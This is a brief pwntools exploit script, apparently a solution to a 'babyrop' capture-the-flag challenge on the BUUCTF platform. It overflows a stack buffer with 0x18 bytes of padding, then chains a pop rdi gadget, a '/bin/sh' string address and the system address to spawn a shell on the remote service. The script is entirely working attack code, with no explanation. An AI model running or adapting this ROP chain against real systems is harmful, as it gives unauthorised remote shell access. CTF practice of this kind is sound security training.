from pwn import *
#sh = process("./babyrop")
sh = remote("node5.buuoj.cn",25478)
pop_rdi =0x00400683
ret = 0x0400479
#system=0x400490
system=0x0004005E3
binsh = 0x00601048
main = 0x4005D6
payload = b"A"*0x18+ p64(pop_rdi) + p64(binsh)+ p64(system)
sh.sendline(payload)
sh.interactive()
